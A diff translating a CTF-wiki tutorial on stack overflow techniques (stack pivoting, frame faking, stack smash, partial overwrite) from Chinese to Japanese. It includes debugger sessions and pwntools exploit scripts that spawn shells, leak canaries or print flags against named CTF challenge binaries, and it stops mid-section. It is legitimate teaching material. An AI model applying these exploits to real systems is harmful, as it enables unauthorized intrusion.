@@ -1,26 +1,26 @@
-#  花式栈溢出技巧
+#  多彩なスタックオーバーフローのテクニック
 
 ## stack pivoting
 
 ### 原理
 
-stack pivoting，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting
+stack pivoting は、その名のとおり、スタックポインタを攻撃者が制御できるメモリを指すように乗っ取り、その位置で ROP を行うテクニックです。一般に、次のような場合に stack pivoting が必要になることがあります。
 
-- 可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链
-- 开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。
-- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用
+- 制御できるスタックオーバーフローのバイト数が少なく、長い ROP チェーンを組み立てにくい
+- PIE 保護が有効でスタックアドレスが分からないとき、スタックを既知の領域に乗っ取れる
+- 他の脆弱性が利用しにくく、変換が必要な場合。たとえばスタックをヒープ領域に乗っ取り、ヒープ上に rop を書いてヒープの脆弱性を利用する
 
-此外，利用 stack pivoting 有以下几个要求
+また、stack pivoting を利用するには、次の条件が必要です。
 
-- 可以控制程序执行流。
+- プログラムの実行フローを制御できること。
 
-- 可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是
+- sp ポインタを制御できること。一般に、スタックポインタの制御には ROP を使います。スタックポインタを制御する一般的な gadget は次のようなものです。
 
 ```asm
 pop rsp/esp
 ```
 
-当然，还会有一些其它的姿势。比如说 libc_csu_init 中的 gadgets，我们通过偏移就可以得到控制 rsp 指针。上面的是正常的，下面的是偏移的。
+もちろん、他にもいくつかのやり方があります。たとえば libc_csu_init 内の gadget は、オフセットをずらすことで rsp ポインタを制御できます。上が通常のもの、下がオフセットをずらしたものです。
 
 ```asm
 gef➤  x/7i 0x000000000040061a
@@ -39,18 +39,18 @@ gef➤  x/7i 0x000000000040061d
 0x400624 <__libc_csu_init+100>:	ret
 ```
 
-  此外，还有更加高级的 fake frame。
+  さらに、より高度な fake frame もあります。
 
 
-- 存在可以控制内容的内存，一般有如下
-  - bss 段。由于进程按页分配内存，分配给 bss 段的内存大小至少一个页(4k，0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且 bss 段分配的内存页拥有读写权限。
-  - heap。但是这个需要我们能够泄露堆地址。
+- 内容を制御できるメモリが存在すること。一般には次のようなものがあります。
+  - bss セグメント。プロセスはページ単位でメモリを割り当てるため、bss セグメントに割り当てられるメモリは少なくとも 1 ページ(4k、0x1000)の大きさです。しかし一般に bss セグメントの内容はそれほど多くの領域を使わず、また bss セグメントに割り当てられたメモリページには読み書きの権限があります。
+  - heap。ただしこれにはヒープアドレスをリークできる必要があります。
 
-### 示例
+### 例
 
 #### 例1
 
-这里我们以 [X-CTF Quals 2016 - b0verfl0w](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w) 为例进行介绍。首先，查看程序的安全保护，如下
+ここでは [X-CTF Quals 2016 - b0verfl0w](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w) を例に紹介します。まず、プログラムのセキュリティ保護を次のように確認します。
 
 ```shell
 ➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 
@@ -62,7 +62,7 @@ gef➤  x/7i 0x000000000040061d
     RWX:      Has RWX segments
 ```
 
-可以看出源程序为 32 位，也没有开启 NX 保护，下面我们来找一下程序的漏洞
+元のプログラムは 32 ビットで、NX 保護も有効になっていないことが分かります。次にプログラムの脆弱性を探します。
 
 ```C
 signed int vul()
@@ -81,12 +81,12 @@ signed int vul()
 }
 ```
 
-可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有 50-0x20-4=14 个字节，所以我们很难执行一些比较好的 ROP。这里我们就考虑 stack pivoting 。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode 并执行。基本利用思路如下
+元のプログラムにスタックオーバーフロー脆弱性があることが分かります。ただし、オーバーフローさせられるバイト数は 50-0x20-4=14 バイトしかないため、比較的よい ROP を実行するのは困難です。そこで stack pivoting を考えます。プログラム自体にスタック保護が有効になっていないので、スタック上に shellcode を配置して実行できます。基本的な利用の方針は次のとおりです。
 
-- 利用栈溢出布置 shellcode
-- 控制 eip 指向 shellcode 处
+- スタックオーバーフローで shellcode を配置する
+- eip が shellcode を指すよう制御する
 
-第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。
+第1段階は比較的簡単で、直接読み込ませるだけです。ただし、プログラム自体で ASLR 保護が有効になっているため、shellcode のアドレスを直接知るのは難しいです。しかしスタック上の相対オフセットは固定なので、スタックオーバーフローで esp を操作して shellcode を指すようにし、プログラムを esp にジャンプさせるよう直接制御できます。次は、プログラムを esp にジャンプさせる gadget を探します。
 
 ```shell
 ➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
@@ -99,26 +99,26 @@ Gadgets information
 Unique gadgets found: 3
 ```
 
-这里我们发现有一个可以直接跳转到 esp 的 gadgets。那么我们可以布置 payload 如下
+ここで、esp に直接ジャンプできる gadget が1つ見つかりました。そこで payload を次のように配置できます。
 
 ```text
 shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
 ```
 
-那么我们 payload 中的最后一部分改如何设置 esp 呢，可以知道
+では payload の最後の部分で esp をどう設定すればよいのでしょうか。次のことが分かっています。
 
 - size(shellcode+padding)=0x20
 - size(fake ebp)=0x4
 - size(0x08048504)=0x4
 
-所以我们最后一段需要执行的指令就是
+したがって、最後の部分で実行すべき命令は次のようになります。
 
 ```asm
 sub esp,0x28
 jmp esp
 ```
 
-所以最后的 exp 如下
+以上から、最終的な exp は次のとおりです。
 
 ```python
 from pwn import *
@@ -136,35 +136,35 @@ sh.sendline(payload)
 sh.interactive()
 ```
 
-#### 例2-转移堆
+#### 例2 - ヒープへの転送
 
-待。
+追記予定です。
 
-### 题目
+### 問題
 
 - [EkoPartyCTF 2016 fuckzing-exploit-200](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200)
 
 ## frame faking
 
-正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。
+このテクニックの名前が示すとおり、偽のスタックフレームを組み立ててプログラムの実行フローを制御するものです。
 
 ### 原理
 
-概括地讲，我们在之前讲的栈溢出不外乎两种方式
+概括すると、これまで説明したスタックオーバーフローは次の2つの方法に尽きます。
 
-- 控制程序 EIP
-- 控制程序 EBP
+- プログラムの EIP を制御する
+- プログラムの EBP を制御する
 
-其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下
+どちらも最終的にはプログラムの実行フローを制御します。frame faking で利用するテクニックは、EBP と EIP を同時に制御することです。これにより、プログラムの実行フローを制御すると同時に、プログラムのスタックフレームの位置も変えます。一般に、その payload は次のとおりです。
 
 ```
 buffer padding|fake ebp|leave ret addr|
 ```
 
-即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分
+つまり、スタックオーバーフローを使ってスタック上を上記の形式に組み立てます。ここでは主に後ろの2つの部分を説明します。
 
-- 函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。
-- 其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下
+- 関数の戻りアドレスを leave ret を実行するアドレスで上書きします。これは、関数が自身の leave ret を正常に実行し終えた後に、もう一度 leave ret が実行されることを意味します。
+- fake ebp は、私たちが組み立てたスタックフレームのベースアドレスで、ここではアドレスであることに注意してください。一般に、組み立てる偽のスタックフレームは次のようになります。
 
 ```
 fake ebp
@@ -173,54 +173,54 @@ v
 ebp2|target function addr|leave ret addr|arg1|arg2
 ```
 
-这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。
+ここでは fake ebp は ebp2 を指します。つまり、ebp2 が置かれているアドレスです。通常、ここは私たちが制御できる、読み取り可能な内容です。
 
-**下面的汇编语法是 intel 语法。**
+**以下のアセンブリの構文は intel 構文です。**
 
-在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作
+基本的な制御の過程を説明する前に、関数のエントリポイントと出口の基本操作を説明しておく必要があります。
 
-入口点
+エントリポイント
 
 ```
-push ebp  # 将ebp压栈
-mov ebp, esp #将esp的值赋给ebp
+push ebp  # ebp をスタックに積む
+mov ebp, esp # esp の値を ebp に代入
 ```
 
-出口点
+出口
 
 ```
 leave
-ret #pop eip，弹出栈顶元素作为程序下一个执行地址
+ret #pop eip。スタックトップの要素を取り出し、プログラムの次の実行アドレスにする
 ```
 
-其中 leave 指令相当于
+このうち leave 命令は次と等価です。
 
 ```
-mov esp, ebp # 将ebp的值赋给esp
-pop ebp # 弹出ebp
+mov esp, ebp # ebp の値を esp に代入
+pop ebp # ebp を取り出す
 ```
 
-下面我们来仔细说一下基本的控制过程。
+では、基本的な制御の過程を詳しく説明します。
 
-1. 在有栈溢出的程序执行 leave 时，其分为两个步骤
+1. スタックオーバーフローのあるプログラムが leave を実行するとき、それは2つのステップに分かれます。
 
-    - mov esp, ebp ，这会将 esp 也指向当前栈溢出漏洞的 ebp 基地址处。
-    - pop ebp， 这会将栈中存放的 fake ebp 的值赋给 ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了 ebp2 所在的地址。
+    - mov esp, ebp 。これにより esp も、現在のスタックオーバーフロー脆弱性のある関数の ebp のベースアドレスを指すようになります。
+    - pop ebp。これにより、スタックに置かれた fake ebp の値が ebp に代入されます。つまり命令の実行後、ebp は ebp2 を指します。すなわち ebp2 が置かれているアドレスが保存されます。
 
-2. 执行 ret 指令，会再次执行 leave ret 指令。
+2. ret 命令を実行すると、leave ret 命令がもう一度実行されます。
 
-3. 执行 leave 指令，其分为两个步骤
+3. leave 命令を実行します。これは2つのステップに分かれます。
 
-    - mov esp, ebp ，这会将 esp 指向 ebp2。
-    - pop ebp，此时，会将 ebp 的内容设置为 ebp2 的值，同时 esp 会指向 target function。
+    - mov esp, ebp 。これにより esp が ebp2 を指します。
+    - pop ebp。このとき ebp の内容が ebp2 の値に設定され、同時に esp は target function を指します。
 
-4. 执行 ret 指令，这时候程序就会执行 target function，当其进行程序的时候会执行
+4. ret 命令を実行すると、プログラムは target function を実行します。そのプログラムに入るとき、次が実行されます。
 
-    - push ebp，会将 ebp2 值压入栈中，
+    - push ebp。ebp2 の値がスタックに積まれます。
 
-    - mov ebp, esp，将 ebp 指向当前基地址。
+    - mov ebp, esp。ebp が現在のベースアドレスを指します。
 
-此时的栈结构如下
+このときのスタックの構造は次のとおりです。
 
 ```
 ebp
@@ -229,17 +229,17 @@ v
 ebp2|leave ret addr|arg1|arg2
 ```
 
-5. 当程序执行时，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。
+5. プログラムの実行時には、通常どおり領域が確保されます。また、スタック上にその関数に対応する引数も配置してあるため、プログラムは正常に実行されます。
 
-6. 程序结束后，其又会执行两次 leave ret addr，所以如果我们在 ebp2 处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。
+6. プログラムが終了すると、再び leave ret addr が2回実行されます。そのため ebp2 に対応する内容を配置しておけば、プログラムの実行フローをずっと制御し続けられます。
 
-可以看出在 fake frame 中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与 stack pivoting 相似。
+fake frame では、書き込み可能なメモリ領域が必要で、しかもそのメモリのアドレスを知っている必要があることが分かります。この点は stack pivoting と似ています。
 
 
 ### 2018 安恒杯 over
-以 2018 年 6 月安恒杯月赛的 over 一题为例进行介绍, 题目可以在 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/fake_frame/over) 中找到
+2018 年 6 月の安恒杯月例コンテストの over という問題を例に紹介します。問題は [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/fake_frame/over) にあります。
 
-#### 文件信息
+#### ファイル情報
 ```bash
 over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped
 [*] '/home/m4x/pwn_repo/others_over/over.over'
@@ -249,11 +249,11 @@ over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically link
     NX:       NX enabled
     PIE:      No PIE
 ```
-64 位动态链接的程序, 没有开 PIE 和 canary 保护, 但开了 
-NX 保护  
 
-#### 分析程序
-放到 IDA 中进行分析 
+64 ビットの動的リンクのプログラムで、PIE と canary 保護は有効ではなく、NX 保護は有効です。
+
+#### プログラムの分析
+IDA で分析します。
 ```C
 __int64 __fastcall main(__int64 a1, char **a2, char **a3)
 {
@@ -274,10 +274,11 @@ int sub_400676()
   return puts(buf);
 }
 ```
-漏洞很明显, read 能读入 96 位, 但 buf 的长度只有 80, 因此能覆盖 rbp 以及 ret addr 但也只能覆盖到 rbp 和 ret addr, 因此也只能通过同时控制 rbp 以及 ret addr 来进行 rop 了
+
+脆弱性は明らかで、read は 96 バイト読み込めますが、buf の長さは 80 しかありません。したがって rbp と ret addr は上書きできますが、上書きできるのは rbp と ret addr までです。そのため、rbp と ret addr を同時に制御することでしか rop を行えません。
 
 #### leak stack
-为了控制 rbp, 我们需要知道某些地址, 可以发现当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 '\0', rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了
+rbp を制御するには、いくつかのアドレスを知る必要があります。入力の長さが 80 のとき、read は入力の末尾に '\0' を補わないため、rbp の値が puts によって出力されることが分かります。これにより、固定オフセットでスタック上のすべての位置のアドレスが分かります。
 ```C
 Breakpoint 1, 0x00000000004006b9 in ?? ()
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
@@ -334,11 +335,11 @@ pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
 0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)
 ```
 
-leak 出栈地址后, 我们就可以通过控制 rbp 为栈上的地址(如 0x7ffceaf11160), ret addr 为 leave ret 的地址来实现控制程序流程了。 
+スタックアドレスを leak した後は、rbp をスタック上のアドレス(0x7ffceaf11160 など)に、ret addr を leave ret のアドレスに制御することで、プログラムの流れを制御できます。
 
-比如我们可以在 0x7ffceaf11160 + 0x8 填上 leak libc 的 rop chain 并控制其返回到 `sub_400676` 函数来 leak libc。 
-​	 
-然后在下一次利用时就可以通过 rop 执行 `system("/bin/sh")` 或 `execve("/bin/sh", 0, 0)` 来 get shell 了, 这道题目因为输入的长度足够, 我们可以布置调用 `execve("/bin/sh", 0, 0)` 的利用链, 这种方法更稳妥(`system("/bin/sh")` 可能会因为 env 被破坏而失效), 不过由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定
+たとえば 0x7ffceaf11160 + 0x8 に leak libc の rop chain を置き、`sub_400676` 関数に戻るよう制御して libc を leak できます。
+
+その次の利用では、rop で `system("/bin/sh")` や `execve("/bin/sh", 0, 0)` を実行して shell を得られます。この問題は入力の長さが十分なので、`execve("/bin/sh", 0, 0)` を呼び出す利用チェーンを配置できます。この方法のほうが確実です(`system("/bin/sh")` は env が壊れていると失敗することがあります)。ただし、利用の過程でスタックの構造が変わるため、重要なオフセットのいくつかはデバッグで確定する必要があります。
 
 #### exp
 ```python
@@ -378,9 +379,9 @@ io.sendafter(">", payload)
 io.interactive()
 ```
 
-总的来说这种方法跟 stack pivot 差别并不是很大。
+総じて、この方法は stack pivot とあまり差がありません。
 
-### 参考阅读
+### 参考文献
 
 - [http://www.xfocus.net/articles/200602/851.html](http://www.xfocus.net/articles/200602/851.html)
 - [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)
@@ -390,7 +391,7 @@ io.interactive()
 ### 原理
 
 
-在程序加了canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 `__stack_chk_fail` 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下
+プログラムに canary 保護が追加された後、読み込んだ buffer が対応する値を上書きすると、プログラムはエラーを出しますが、一般にはそのエラー情報を気にしません。stack smash というテクニックは、この情報を出力するプログラムを利用して、欲しい内容を得るものです。これは、プログラムで canary 保護が有効になった後、canary が書き換えられたことを検出すると、プログラムが `__stack_chk_fail` 関数を実行して argv[0] ポインタが指す文字列を出力するためです。通常、このポインタはプログラム名を指しています。そのコードは次のとおりです。
 
 ```C
 void __attribute__ ((noreturn)) __stack_chk_fail (void)
@@ -406,11 +407,11 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
 }
 ```
 
-所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 `__fortify_fail` 函数中就会输出我们想要的信息。
+したがって、スタックオーバーフローで argv[0] を、出力させたい文字列のアドレスで上書きすれば、`__fortify_fail` 関数の中で欲しい情報が出力されます。
 
 
 
-> 批注： 这个方法在 glibc-2.31 之后不可用了, 具体看这个部分代码 [fortify_fail.c](https://elixir.bootlin.com/glibc/glibc-2.31/source/debug/fortify_fail.c) 。
+> 注記: この方法は glibc-2.31 以降では使えません。詳しくは、この部分のコード [fortify_fail.c](https://elixir.bootlin.com/glibc/glibc-2.31/source/debug/fortify_fail.c) を見てください。
 
 ```c
 #include <stdio.h>
@@ -426,15 +427,15 @@ __fortify_fail (const char *msg)
 libc_hidden_def (__fortify_fail)
 ```
 
-> 总结一下原因就是现在不会打印argv[0] 指针所指向的字符串
+> 理由をまとめると、argv[0] ポインタが指す文字列が出力されなくなったためです
 
 ### 32C3 CTF readme
 
-这里，我们以 2015 年 32C3 CTF readme 为例进行介绍，该题目在 [jarvisoj](https://www.jarvisoj.com/challenges) 上有复现。方便读者复现, binary 也可以在 [ctf-challenge ](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/stacksmashes/32c3-CTF-readme)这个仓库找到
+ここでは 2015 年の 32C3 CTF readme を例に紹介します。この問題は [jarvisoj](https://www.jarvisoj.com/challenges) に再現があります。読者が再現しやすいように、binary は [ctf-challenge ](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/stacksmashes/32c3-CTF-readme)のリポジトリにもあります。
 
-#### 确定保护
+#### 保護の確認
 
-可以看出程序为 64 位，主要开启了 Canary 保护以及 NX 保护，以及 FORTIFY 保护。
+プログラムは 64 ビットで、主に Canary 保護と NX 保護、さらに FORTIFY 保護が有効になっていることが分かります。
 
 ```shell
 ➜  stacksmashes git:(master) ✗ checksec smashes
@@ -446,9 +447,9 @@ libc_hidden_def (__fortify_fail)
     FORTIFY:  Enabled
 ```
 
-#### 分析程序
+#### プログラムの分析
 
-ida 看一下
+ida で見てみます。
 
 ```c
 __int64 sub_4007E0()
@@ -485,15 +486,15 @@ LABEL_8:
 }
 ```
 
-很显然，程序在 `_IO_gets((__int64)&v4)`; 存在栈溢出。
+明らかに、プログラムは `_IO_gets((__int64)&v4)`; にスタックオーバーフローがあります。
 
-此外，程序中还提示要 overwrite flag。而且发现程序很有意思的在 while 循环之后执行了这条语句
+また、プログラムは flag を overwrite するようにも促しています。さらに、プログラムが while ループの後にこの文を実行しているのが興味深いです。
 
 ```C
   memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
 ```
 
-又看了看对应地址的内容，可以发现如下内容，说明程序的flag就在这里。
+対応するアドレスの内容を見ると、次の内容があり、プログラムの flag がここにあることが分かります。
 
 
 ```
@@ -501,13 +502,13 @@ LABEL_8:
 .data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0
 ```
 
-但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容 ` byte_600D20[v1++] = v2;`也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了
+しかし、スタックオーバーフローでこのアドレスの内容を直接出力するのは不可能です。読み込む内容 ` byte_600D20[v1++] = v2;` がちょうどこのメモリブロックでもあり、これを直接上書きしてしまうからです。そこで、あるテクニックを使う必要があります。
 
-- 在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find来进行查找。
+- ELF のメモリマッピングでは、bss セグメントは2回マップされます。そのため別の場所のアドレスを使って出力できます。gdb の find で探せます。
 
-#### 确定 flag 地址
+#### flag のアドレスの確定
 
-我们把断点下载 memset 函数处，然后读取相应的内容如下
+memset 関数にブレークポイントを置き、対応する内容を次のように読み取ります。
 
 ```asm
 gef➤  c
@@ -558,13 +559,13 @@ gef➤  grep PCTF
   0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" 
 ```
 
-可以看出我们读入的 2222 已经覆盖了 0x600d20 处的 flag，但是我们在内存的 0x400d20 处仍然找到了这个flag的备份，所以我们还是可以将其输出。这里我们已经确定了 flag 的地址。
+読み込んだ 2222 が 0x600d20 にある flag を上書きしていますが、メモリの 0x400d20 にこの flag のコピーが見つかります。そのため、これを出力できます。ここで flag のアドレスが確定しました。
 
-#### 确定偏移
+#### オフセットの確定
 
-下面，我们确定 argv[0] 距离读取的字符串的偏移。
+次に、argv[0] の、読み込んだ文字列からのオフセットを確定します。
 
-首先下断点在 main 函数入口处，如下
+まず main 関数の入口にブレークポイントを置きます。次のとおりです。
 
 ```asm
 gef➤  b *0x00000000004006D0
@@ -600,9 +601,9 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 
 ```
 
-可以看出 0x00007fffffffe00b 指向程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x00007fffffffdc58 处保留着该地址，所以我们真正需要的地址是 0x00007fffffffdc58。
+0x00007fffffffe00b がプログラム名を指していることが分かります。これは当然 argv[0] であり、書き換える内容はこのアドレスです。また 0x00007fffffffdc58 にこのアドレスが保存されているので、実際に必要なアドレスは 0x00007fffffffdc58 です。
 
-此外，根据汇编代码
+さらに、アセンブリコードから
 
 ```asm
 .text:00000000004007E0                 push    rbp
@@ -618,7 +619,7 @@ Breakpoint 1, 0x00000000004006d0 in ?? ()
 .text:000000000040080E                 call    __IO_gets
 ```
 
-我们可以确定我们读入的字符串的起始地址其实就是调用 `__IO_gets` 之前的 rsp，所以我们把断点下在 call 处，如下
+読み込む文字列の先頭アドレスは、実は `__IO_gets` を呼び出す前の rsp であると確定できます。そこで call のところにブレークポイントを置きます。次のとおりです。
 
 ```asm
 gef➤  b *0x000000000040080E
@@ -655,7 +656,7 @@ gef➤  print $rsp
 $1 = (void *) 0x7fffffffda40
 ```
 
-可以看出rsp的值为0x7fffffffda40，那么相对偏移为
+rsp の値は 0x7fffffffda40 であることが分かります。したがって相対オフセットは次のとおりです。
 
 ```python
 >>> 0x00007fffffffdc58-0x7fffffffda40
@@ -664,9 +665,9 @@ $1 = (void *) 0x7fffffffda40
 '0x218'
 ```
 
-#### 利用程序
+#### 利用プログラム
 
-我们构造利用程序如下
+利用プログラムを次のように組み立てます。
 
 ```python
 from pwn import *
@@ -689,19 +690,19 @@ data = sh.recv()
 sh.interactive()
 ```
 
-这里我们直接就得到了 flag，没有出现网上说的得不到 flag 的情况。
+ここでは直接 flag が得られ、ネット上で言われているような flag が得られないという状況は起きませんでした。
 
-### 题目
-- 2018 网鼎杯 - guess
+### 問題
+- 2018 網鼎杯 - guess
 
-## 栈上的 partial overwrite
-partial overwrite 这种技巧在很多地方都适用, 这里先以栈上的 partial overwrite 为例来介绍这种思想。
+## スタック上の partial overwrite
+partial overwrite というテクニックは多くの場面で使えます。ここではまずスタック上の partial overwrite を例に、この考え方を紹介します。
 
-我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。
+ランダム化(ASLR、PIE)が有効になっていても、上位のアドレスがどう変化しても、下位 12 ビットのページ内オフセットは常に固定であることが分かっています。つまり、下位のオフセットを変更できれば、ある程度プログラムの実行フローを制御し、PIE 保護を回避できます。
 
 ### 2018-安恒杯-babypie
-以安恒杯 2018 年 7 月月赛的 babypie 为例分析这一种利用技巧, 题目的 binary 放在了 [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/partial_overwrite) 中
-#### 确定保护
+安恒杯 2018 年 7 月の月例コンテストの babypie を例に、このテクニックの利用を分析します。問題の binary は [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/partial_overwrite) に置かれています。
+#### 保護の確認
 ```bash
 babypie: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped
 [*] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie'
@@ -711,9 +712,10 @@ babypie: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically lin
     NX:       NX enabled
     PIE:      PIE enabled
 ```
-64 位动态链接的文件, 开启了 PIE 保护和栈溢出保护
-#### 分析程序
-IDA 中看一下, 很容易就能发现漏洞点, 两处输入都有很明显的栈溢出漏洞, 需要注意的是在输入之前, 程序对栈空间进行了清零, 这样我们就无法通过打印栈上信息来 leak binary 或者 libc 的基址了
+
+64 ビットの動的リンクのファイルで、PIE 保護とスタックオーバーフロー保護(canary)が有効です。
+#### プログラムの分析
+IDA で見ると、脆弱性のある場所は簡単に見つかります。2か所の入力のどちらにも明らかなスタックオーバーフロー脆弱性があります。注意すべきは、入力の前にプログラムがスタック領域をゼロクリアしていることです。そのため、スタック上の情報を出力させて binary や libc のベースアドレスを leak することはできません。
 ```C
 __int64 sub_960()
 {
@@ -733,7 +735,7 @@ __int64 sub_960()
 }
 ```
 
-同时也发现程序中给了能直接 get shell 的函数
+同時に、プログラム内に直接 get shell できる関数が用意されていることも分かります。
 ```asm
 .text:0000000000000A3E getshell        proc near
 .text:0000000000000A3E ; __unwind { .text:0000000000000A3E                 push    rbp
@@ -746,12 +748,12 @@ __int64 sub_960()
 .text:0000000000000A50 ; } // starts at A3E
 .text:0000000000000A50 getshell        endp
 ```
-这样我们只要控制 rip 到该函数即可
+そこで、rip をこの関数に制御するだけで済みます。
 
 #### leak canary
-在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。
+最初の read の直後にすぐ出力があり、read は入力の末尾に \0 を付けないため、スタック上の内容を leak する機会が得られます。
 
-为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 (+ 1 是为了覆盖 canary 的最低位为非 0 的值, printf 使用 %s 时, 遇到 \0 结束, 覆盖 canary 低位为非 0 值时, canary 就可以被 printf 打印出来了)
+2回目のオーバーフローで戻りアドレスを制御できるように、canary を leak します。最初の read に必要な長さは 0x30 - 0x8 + 1 と計算できます(+ 1 は canary の最下位バイトを 0 以外の値で上書きするためです。printf が %s を使うとき、\0 に出会うと終了します。canary の最下位バイトを 0 以外の値で上書きすれば、canary を printf で出力できます)。
 
 ```asm
 Breakpoint 1, 0x0000557c8443aa08 in ?? ()
@@ -802,10 +804,10 @@ canary : 0xb3012605fc402a00
 pwndbg>
 ```
 
-canary 在 rbp - 0x8 的位置上, 可以看出此时 canary 的低位已经被覆盖为 0x61, 这样只要接收 'a' * (0x30 - 0x8 + 1) 后的 7 位, 再加上最低位的 '\0', 我们就恢复出程序的 canary 了
+canary は rbp - 0x8 の位置にあり、このとき canary の最下位バイトがすでに 0x61 に上書きされていることが分かります。したがって、'a' * (0x30 - 0x8 + 1) の後の 7 バイトを受信し、最下位バイトの '\0' を加えれば、プログラムの canary を復元できます。
 
-#### 覆盖返回地址
-有了 canary 后, 就可以通过第二次的栈溢出来改写返回地址了, 控制返回地址到 getshell 函数即可, 我们先看一下没溢出时的返回地址
+#### 戻りアドレスの上書き
+canary を得たら、2回目のスタックオーバーフローで戻りアドレスを書き換えられます。戻りアドレスを getshell 関数に制御するだけです。まず、オーバーフローさせていないときの戻りアドレスを見てみます。
 
 ```asm
 0x000055dc43694a1e in ?? ()
@@ -861,9 +863,9 @@ pwndbg> x/10i (0x0A3E+0x55dc43694000)
    0x55dc43694a52:	mov    rbp,rsp
    0x55dc43694a55:	sub    rsp,0x10
 ```
-可以发现, 此时的返回地址与 get shell 函数的地址只有低位的 8 bit 不同, 如果覆写低 8 bit 为 `0x?A3E`, 就有一定的几率 get shell
